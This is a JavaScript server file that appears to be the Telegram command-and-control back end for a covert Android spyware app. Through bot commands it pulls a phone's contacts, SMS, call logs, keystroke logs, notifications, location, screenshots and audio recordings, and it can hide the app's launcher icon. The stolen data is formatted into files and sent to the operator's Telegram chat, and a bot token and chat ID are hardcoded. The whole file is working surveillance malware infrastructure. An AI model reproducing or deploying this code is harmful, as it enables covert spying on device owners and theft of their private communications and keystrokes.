const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Middleware
app.use(express.json());

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

// ============= TELEGRAM MESSAGE HELPERS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramDocument(chatId, content, filename, caption) {
    try {
        console.log(`📎 Sending document ${filename} to ${chatId}`);
        
        // Create a buffer from the content
        const buffer = Buffer.from(content, 'utf-8');
        
        // Create form data
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', new Blob([buffer]), filename);
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                'Content-Type': 'multipart/form-data'
            }
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        return null;
    }
}

// ============= FILE FORMATTERS =============

function formatContactsAsHTML(contacts) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Contacts Export</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }
        .contact { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .name { font-size: 18px; font-weight: bold; color: #4CAF50; }
        .number { font-size: 16px; color: #666; margin-top: 5px; }
        .count { background: #4CAF50; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
    </style>
</head>
<body>
    <h1>📇 Contacts Export</h1>
    <div class="count">Total Contacts: ${contacts.length}</div>
    <hr>`;

    contacts.forEach((contact, index) => {
        html += `
    <div class="contact">
        <div class="name">${index + 1}. ${contact.name || 'Unknown'}</div>
        <div class="number">📞 ${contact.number || 'No number'}</div>
    </div>`;
    });

    html += `
</body>
</html>`;
    return html;
}

function formatContactsAsTXT(contacts) {
    let text = "📇 CONTACTS EXPORT\n";
    text += "=".repeat(50) + "\n";
    text += `Total Contacts: ${contacts.length}\n`;
    text += "=".repeat(50) + "\n\n";

    contacts.forEach((contact, index) => {
        text += `${index + 1}. Name: ${contact.name || 'Unknown'}\n`;
        text += `   Phone: ${contact.number || 'No number'}\n`;
        text += "-".repeat(30) + "\n";
    });

    return text;
}

function formatSMSAsHTML(messages) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SMS Export</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1 { color: #333; border-bottom: 2px solid #2196F3; padding-bottom: 10px; }
        .message { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .incoming { border-left: 4px solid #4CAF50; }
        .sent { border-left: 4px solid #2196F3; }
        .address { font-size: 16px; font-weight: bold; color: #333; }
        .body { font-size: 14px; color: #666; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 5px; }
        .time { font-size: 12px; color: #999; margin-top: 5px; }
        .count { background: #2196F3; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
    </style>
</head>
<body>
    <h1>💬 SMS Messages Export</h1>
    <div class="count">Total Messages: ${messages.length}</div>
    <hr>`;

    messages.forEach((msg, index) => {
        const typeClass = msg.type === 'INBOX' ? 'incoming' : 'sent';
        const typeIcon = msg.type === 'INBOX' ? '📥' : '📤';
        const date = new Date(parseInt(msg.date));
        
        html += `
    <div class="message ${typeClass}">
        <div class="address">${typeIcon} ${msg.address}</div>
        <div class="body">${msg.body.replace(/\n/g, '<br>')}</div>
        <div class="time">${date.toLocaleString()}</div>
    </div>`;
    });

    html += `
</body>
</html>`;
    return html;
}

function formatSMSAsTXT(messages) {
    let text = "💬 SMS MESSAGES EXPORT\n";
    text += "=".repeat(50) + "\n";
    text += `Total Messages: ${messages.length}\n`;
    text += "=".repeat(50) + "\n\n";

    messages.forEach((msg, index) => {
        const type = msg.type === 'INBOX' ? 'INCOMING' : 'SENT';
        const date = new Date(parseInt(msg.date));
        
        text += `[${index + 1}] ${type} - ${date.toLocaleString()}\n`;
        text += `From/To: ${msg.address}\n`;
        text += `Message: ${msg.body}\n`;
        text += "-".repeat(40) + "\n\n";
    });

    return text;
}

function formatCallLogsAsHTML(calls) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Call Logs Export</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1 { color: #333; border-bottom: 2px solid #FF9800; padding-bottom: 10px; }
        .call { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .incoming { border-left: 4px solid #4CAF50; }
        .outgoing { border-left: 4px solid #2196F3; }
        .missed { border-left: 4px solid #f44336; }
        .number { font-size: 16px; font-weight: bold; color: #333; }
        .details { font-size: 14px; color: #666; margin-top: 5px; }
        .time { font-size: 12px; color: #999; margin-top: 5px; }
        .count { background: #FF9800; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
    </style>
</head>
<body>
    <h1>📞 Call Logs Export</h1>
    <div class="count">Total Calls: ${calls.length}</div>
    <hr>`;

    calls.forEach((call, index) => {
        const typeClass = call.type === 'INCOMING' ? 'incoming' : (call.type === 'OUTGOING' ? 'outgoing' : 'missed');
        const typeIcon = call.type === 'INCOMING' ? '⬇️' : (call.type === 'OUTGOING' ? '⬆️' : '❌');
        const date = new Date(parseInt(call.date));
        const caller = call.name || call.number;
        
        html += `
    <div class="call ${typeClass}">
        <div class="number">${typeIcon} ${caller}</div>
        <div class="details">Type: ${call.type} | Duration: ${call.duration}s</div>
        <div class="time">${date.toLocaleString()}</div>
    </div>`;
    });

    html += `
</body>
</html>`;
    return html;
}

function formatCallLogsAsTXT(calls) {
    let text = "📞 CALL LOGS EXPORT\n";
    text += "=".repeat(50) + "\n";
    text += `Total Calls: ${calls.length}\n`;
    text += "=".repeat(50) + "\n\n";

    calls.forEach((call, index) => {
        const date = new Date(parseInt(call.date));
        const caller = call.name || call.number;
        
        text += `[${index + 1}] ${call.type} Call\n`;
        text += `Number: ${caller}\n`;
        text += `Duration: ${call.duration} seconds\n`;
        text += `Time: ${date.toLocaleString()}\n`;
        text += "-".repeat(40) + "\n\n";
    });

    return text;
}

function formatAppsAsHTML(apps) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Installed Apps Export</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1 { color: #333; border-bottom: 2px solid #9C27B0; padding-bottom: 10px; }
        .app { background: white; margin: 5px 0; padding: 10px 15px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .system { background: #e3f2fd; }
        .user { background: #f1f8e9; }
        .name { font-size: 14px; font-weight: bold; color: #333; }
        .package { font-size: 12px; color: #666; font-family: monospace; }
        .count { background: #9C27B0; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
    </style>
</head>
<body>
    <h1>📱 Installed Apps Export</h1>
    <div class="count">Total Apps: ${apps.length}</div>
    <hr>`;

    apps.forEach((app, index) => {
        const isSystem = app.isSystem === 'true';
        const appClass = isSystem ? 'system' : 'user';
        const icon = isSystem ? '⚙️' : '📱';
        
        html += `
    <div class="app ${appClass}">
        <div class="name">${icon} ${app.name}</div>
        <div class="package">${app.package}</div>
    </div>`;
    });

    html += `
</body>
</html>`;
    return html;
}

function formatAppsAsTXT(apps) {
    let text = "📱 INSTALLED APPS EXPORT\n";
    text += "=".repeat(50) + "\n";
    text += `Total Apps: ${apps.length}\n`;
    text += "=".repeat(50) + "\n\n";

    apps.forEach((app, index) => {
        const type = app.isSystem === 'true' ? '[SYSTEM]' : '[USER]';
        text += `${index + 1}. ${type} ${app.name}\n`;
        text += `   Package: ${app.package}\n`;
    });

    return text;
}

function formatKeystrokesAsHTML(keystrokes) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Keystroke Logs Export</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1 { color: #333; border-bottom: 2px solid #607D8B; padding-bottom: 10px; }
        .keystroke { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .app { font-size: 14px; color: #607D8B; font-weight: bold; }
        .text { font-size: 14px; color: #333; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 5px; font-family: monospace; }
        .time { font-size: 12px; color: #999; margin-top: 5px; }
        .count { background: #607D8B; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
    </style>
</head>
<body>
    <h1>⌨️ Keystroke Logs Export</h1>
    <div class="count">Total Keystrokes: ${keystrokes.length}</div>
    <hr>`;

    keystrokes.forEach((log, index) => {
        const date = new Date(log.timestamp);
        const app = log.packageName || 'unknown';
        
        html += `
    <div class="keystroke">
        <div class="app">📱 ${app}</div>
        <div class="text">${log.data || ''}</div>
        <div class="time">${date.toLocaleString()}</div>
    </div>`;
    });

    html += `
</body>
</html>`;
    return html;
}

function formatKeystrokesAsTXT(keystrokes) {
    let text = "⌨️ KEYSTROKE LOGS EXPORT\n";
    text += "=".repeat(50) + "\n";
    text += `Total Keystrokes: ${keystrokes.length}\n`;
    text += "=".repeat(50) + "\n\n";

    keystrokes.forEach((log, index) => {
        const date = new Date(log.timestamp);
        text += `[${index + 1}] ${date.toLocaleString()}\n`;
        text += `App: ${log.packageName || 'unknown'}\n`;
        text += `Text: ${log.data || ''}\n`;
        text += "-".repeat(40) + "\n\n";
    });

    return text;
}

function formatNotificationsAsHTML(notifications) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Notifications Export</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1 { color: #333; border-bottom: 2px solid #FF5722; padding-bottom: 10px; }
        .notification { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); border-left: 4px solid #FF5722; }
        .app { font-size: 14px; color: #FF5722; font-weight: bold; }
        .title { font-size: 16px; font-weight: bold; color: #333; margin-top: 5px; }
        .text { font-size: 14px; color: #666; margin-top: 10px; }
        .time { font-size: 12px; color: #999; margin-top: 5px; }
        .count { background: #FF5722; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
    </style>
</head>
<body>
    <h1>🔔 Notifications Export</h1>
    <div class="count">Total Notifications: ${notifications.length}</div>
    <hr>`;

    notifications.forEach((log, index) => {
        const date = new Date(log.timestamp);
        const app = log.packageName || 'unknown';
        
        html += `
    <div class="notification">
        <div class="app">📱 ${app}</div>
        <div class="title">${log.title || ''}</div>
        <div class="text">${log.data || ''}</div>
        <div class="time">${date.toLocaleString()}</div>
    </div>`;
    });

    html += `
</body>
</html>`;
    return html;
}

function formatNotificationsAsTXT(notifications) {
    let text = "🔔 NOTIFICATIONS EXPORT\n";
    text += "=".repeat(50) + "\n";
    text += `Total Notifications: ${notifications.length}\n`;
    text += "=".repeat(50) + "\n\n";

    notifications.forEach((log, index) => {
        const date = new Date(log.timestamp);
        text += `[${index + 1}] ${date.toLocaleString()}\n`;
        text += `App: ${log.packageName || 'unknown'}\n`;
        if (log.title) text += `Title: ${log.title}\n`;
        if (log.data) text += `Content: ${log.data}\n`;
        text += "-".repeat(40) + "\n\n";
    });

    return text;
}

// ============= COMMAND HELPERS =============

function getHelpMessage() {
    return `<b>🤖 COMPLETE COMMAND LIST</b>

<b>🔍 MONITORING COMMANDS</b>
/help - Get help 
/status - Get full device status
/location - Get current GPS location
/battery - Get battery level only
/storage - Get storage information
/network - Get network info (IP, WiFi, Mobile)

<b>📸 SCREENSHOT SIZE COMMANDS</b>
/small - Max compression, smallest files
/medium - Balanced quality/size
/original - Best quality, largest files
/size_status - Check current size setting
/screenshot_settings - View all settings

<b>📱 DATA EXTRACTION COMMANDS - RETURNS AS FILES</b>
/contacts_txt - Get contacts as TXT file
/contacts_html - Get contacts as HTML file
/sms_txt - Get SMS messages as TXT file
/sms_html - Get SMS messages as HTML file
/calllogs_txt - Get call logs as TXT file
/calllogs_html - Get call logs as HTML file
/apps_txt - Get apps list as TXT file
/apps_html - Get apps list as HTML file
/keystrokes_txt - Get keystrokes as TXT file
/keystrokes_html - Get keystrokes as HTML file
/notifications_txt - Get notifications as TXT file
/notifications_html - Get notifications as HTML file

<b>🎤 RECORDING COMMANDS</b>
/record - Start 60s audio recording
/start_recording - Start scheduled recording
/stop_recording - Stop recording service

<b>⚙️ SERVICE CONTROL</b>
/start_screenshot - Start screenshot service
/stop_screenshot - Stop screenshot service
/start_stream - Start streaming
/stop_stream - Stop streaming
/reboot_app - Restart all services

<b>🛠️ UTILITY COMMANDS</b>
/ping - Test connection
/time - Get device time
/info - Get detailed device info
/hide_icon - Hide launcher icon
/show_icon - Show launcher icon

<b>📊 STATS COMMANDS</b>
/logs_count - Get total log count
/logs_recent - Get 10 most recent logs
/stats - Get detailed statistics
/clear_logs - Clear all logs

<b>📋 FILE FORMATS</b>
• TXT files - Simple text format
• HTML files - Formatted with styling
All files are sent as downloadable documents`;
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update:', JSON.stringify(update, null, 2));

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
    console.log(`📊 Devices in memory: ${devices.size}`);

    if (command === '/help' || command === '/start') {
        console.log('📋 Sending help menu directly from server');
        const helpMessage = getHelpMessage();
        await sendTelegramMessage(chatId, helpMessage);
        console.log('✅ Help menu sent');
        return;
    }

    let deviceId = null;
    let device = null;
    
    for (const [id, d] of devices.entries()) {
        if (String(d.chatId) === String(chatId)) {
            deviceId = id;
            device = d;
            console.log(`✅ Found device: ${deviceId}`);
            break;
        }
    }

    if (!deviceId) {
        console.log(`❌ No device found for chat ${chatId}`);
        await sendTelegramMessage(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.');
        return;
    }

    device.lastSeen = Date.now();

    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commandObject = {
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command queued:`, commandObject);
    console.log(`📊 Pending commands: ${device.pendingCommands.length}`);

    let ackMessage = `⏳ Processing: ${command}`;
    
    if (cleanCommand.includes('contacts')) {
        ackMessage = `📇 Generating contacts file...`;
    } else if (cleanCommand.includes('sms')) {
        ackMessage = `💬 Generating SMS file...`;
    } else if (cleanCommand.includes('calllogs')) {
        ackMessage = `📞 Generating call logs file...`;
    } else if (cleanCommand.includes('apps')) {
        ackMessage = `📱 Generating apps list file...`;
    } else if (cleanCommand.includes('keystrokes')) {
        ackMessage = `⌨️ Generating keystrokes file...`;
    } else if (cleanCommand.includes('notifications')) {
        ackMessage = `🔔 Generating notifications file...`;
    } else if (cleanCommand === 'storage') {
        ackMessage = `💾 Calculating storage usage...`;
    } else if (cleanCommand === 'network') {
        ackMessage = `📡 Getting network information...`;
    } else if (cleanCommand === 'screenshot_settings') {
        ackMessage = `📸 Fetching screenshot settings...`;
    }
    
    await sendTelegramMessage(chatId, ackMessage);
}

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: authorizedChats.size,
        timestamp: Date.now()
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`💓 Ping from device ${deviceId}`);
    
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = [...device.pendingCommands];
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
            
            commands.forEach(cmd => {
                console.log(`   └─ ${cmd.command}`);
            });
            
            sendJsonResponse(res, { commands });
        } else {
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error, dataType, content } = req.body;
    
    console.log(`📨 Result from ${deviceId}:`, { command, dataType, contentLength: content?.length });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        
        if (error) {
            await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else if (dataType && content) {
            // Handle file responses
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            let filename, caption;
            
            switch (dataType) {
                case 'contacts_txt':
                    filename = `contacts_${timestamp}.txt`;
                    caption = `📇 Contacts Export (${content.length} contacts)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'contacts_html':
                    filename = `contacts_${timestamp}.html`;
                    caption = `📇 Contacts Export (HTML)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'sms_txt':
                    filename = `sms_${timestamp}.txt`;
                    caption = `💬 SMS Export (${content.length} messages)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'sms_html':
                    filename = `sms_${timestamp}.html`;
                    caption = `💬 SMS Export (HTML)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'calllogs_txt':
                    filename = `call_logs_${timestamp}.txt`;
                    caption = `📞 Call Logs Export (${content.length} calls)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'calllogs_html':
                    filename = `call_logs_${timestamp}.html`;
                    caption = `📞 Call Logs Export (HTML)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'apps_txt':
                    filename = `apps_${timestamp}.txt`;
                    caption = `📱 Apps List Export (${content.length} apps)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'apps_html':
                    filename = `apps_${timestamp}.html`;
                    caption = `📱 Apps List Export (HTML)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'keystrokes_txt':
                    filename = `keystrokes_${timestamp}.txt`;
                    caption = `⌨️ Keystrokes Export (${content.length} entries)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'keystrokes_html':
                    filename = `keystrokes_${timestamp}.html`;
                    caption = `⌨️ Keystrokes Export (HTML)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'notifications_txt':
                    filename = `notifications_${timestamp}.txt`;
                    caption = `🔔 Notifications Export (${content.length} notifications)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                case 'notifications_html':
                    filename = `notifications_${timestamp}.html`;
                    caption = `🔔 Notifications Export (HTML)`;
                    await sendTelegramDocument(chatId, content, filename, caption);
                    break;
                default:
                    await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
            }
        } else {
            await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
        }
    }
    
    res.sendStatus(200);
});

app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
    
    if (!deviceId || !chatId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    if (!isAuthorizedChat(chatId)) {
        console.log(`⛔ Unauthorized registration from chat: ${chatId}`);
        return res.status(403).json({ error: 'Chat ID not authorized' });
    }
    
    const deviceData = {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
    console.log(`📊 Total devices: ${devices.size}`);
    
    await sendTelegramMessage(chatId, 
        `✅ <b>Device Connected!</b>\n\n` +
        `Model: ${deviceInfo.model}\n` +
        `Android: ${deviceInfo.android}\n` +
        `Battery: ${deviceInfo.battery}\n` +
        `ID: ${deviceId.substring(0, 8)}...\n\n` +
        `<b>📸 Screenshot Size Options:</b>\n` +
        `• /small - Max compression\n` +
        `• /medium - Balanced\n` +
        `• /original - Best quality\n\n` +
        `<b>📱 Data Extraction (as files):</b>\n` +
        `• /contacts_txt - Contacts (TXT)\n` +
        `• /contacts_html - Contacts (HTML)\n` +
        `• /sms_txt - SMS (TXT)\n` +
        `• /sms_html - SMS (HTML)\n` +
        `• /calllogs_txt - Call logs (TXT)\n` +
        `• /calllogs_html - Call logs (HTML)\n` +
        `• /apps_txt - Apps list (TXT)\n` +
        `• /apps_html - Apps list (HTML)\n` +
        `• /keystrokes_txt - Keystrokes (TXT)\n` +
        `• /keystrokes_html - Keystrokes (HTML)\n` +
        `• /notifications_txt - Notifications (TXT)\n` +
        `• /notifications_html - Notifications (HTML)\n\n` +
        `<b>🔍 Info Commands:</b>\n` +
        `• /storage - Storage usage\n` +
        `• /network - Network details\n` +
        `• /screenshot_settings - Current settings\n\n` +
        `Current size: <b>MEDIUM</b>`);
    
    res.json({ status: 'registered', deviceId });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown',
            pendingCommands: device.pendingCommands?.length || 0
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

app.get('/api/debug/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        res.json({
            deviceId,
            chatId: device.chatId,
            deviceInfo: device.deviceInfo,
            lastSeen: new Date(device.lastSeen).toISOString(),
            pendingCommands: device.pendingCommands || []
        });
    } else {
        res.json({ error: 'Device not found' });
    }
});

app.get('/test', (req, res) => {
    res.send(`
        <html>
        <body style="font-family: Arial; padding: 20px;">
            <h1 style="color: #4CAF50;">✅ Server Running</h1>
            <p><b>Time:</b> ${new Date().toISOString()}</p>
            <p><b>Devices:</b> ${devices.size}</p>
            <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
            <p><b>Commands return files:</b> /contacts_txt, /contacts_html, /sms_txt, /sms_html, /calllogs_txt, /calllogs_html</p>
            <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
        </body>
        </html>
    `);
});

app.get('/test-help', async (req, res) => {
    const chatId = '5326373447';
    const helpMessage = getHelpMessage();
    const result = await sendTelegramMessage(chatId, helpMessage);
    res.json({ success: !!result, result });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n📱 NEW FILE-BASED COMMANDS:');
    console.log('   └─ /contacts_txt     - Contacts as TXT file');
    console.log('   └─ /contacts_html    - Contacts as HTML file');
    console.log('   └─ /sms_txt          - SMS as TXT file');
    console.log('   └─ /sms_html         - SMS as HTML file');
    console.log('   └─ /calllogs_txt     - Call logs as TXT file');
    console.log('   └─ /calllogs_html    - Call logs as HTML file');
    console.log('   └─ /apps_txt         - Apps as TXT file');
    console.log('   └─ /apps_html        - Apps as HTML file');
    console.log('   └─ /keystrokes_txt   - Keystrokes as TXT file');
    console.log('   └─ /keystrokes_html  - Keystrokes as HTML file');
    console.log('   └─ /notifications_txt - Notifications as TXT file');
    console.log('   └─ /notifications_html - Notifications as HTML file');
    console.log('\n🚀 ===============================================\n');
});
